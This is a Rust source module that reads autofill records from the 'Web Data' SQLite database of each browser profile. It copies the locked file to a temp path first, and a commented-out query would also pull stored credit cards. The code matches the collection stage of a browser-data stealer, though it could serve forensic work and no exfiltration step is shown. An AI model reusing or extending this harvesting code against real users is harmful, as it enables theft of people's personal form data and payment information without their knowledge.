use rusqlite::Connection;
use std::path::PathBuf;

#[allow(dead_code)]
#[derive(Debug)]
pub(super) struct AutoFillEntry {
    k: String,
    v: String,
}

pub(super) async fn get_autofill(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
) -> std::io::Result<Vec<Vec<AutoFillEntry>>> {
    let mut result = Vec::<Vec<AutoFillEntry>>::with_capacity(profiles.len());

    for profile in profiles {
        path.push(profile);
        path.push("Web Data");

        super::check_db_size(path).await?;

        // Copy the file to the temporary folder
        std::fs::copy(&path, tempfile).unwrap();

        // Connect to the SQLite database
        let conn = Connection::open(tempfile).unwrap();
        let mut statement = conn
            .prepare("SELECT * FROM autofill WHERE value IS NOT NULL")
            .unwrap();

        // Execute the command and collect the data
        let it = statement
            .query_map([], |row| {
                Ok(AutoFillEntry {
                    k: row.get::<usize, String>(0).unwrap(),
                    v: row.get::<usize, String>(1).unwrap(),
                    // row.get::<usize, String>(2).unwrap(),
                    // ignored due to same as val
                })
            })
            .unwrap();

        result.push(
            it.into_iter()
                .map(|x| x.unwrap())
                .collect::<Vec<AutoFillEntry>>(),
        );

        // getting credit cards
        // statement = conn.prepare("SELECT * FROM credit_cards").unwrap();

        std::fs::remove_file(tempfile).unwrap();
        path.pop();
        path.pop();
    }

    Ok(result)
}
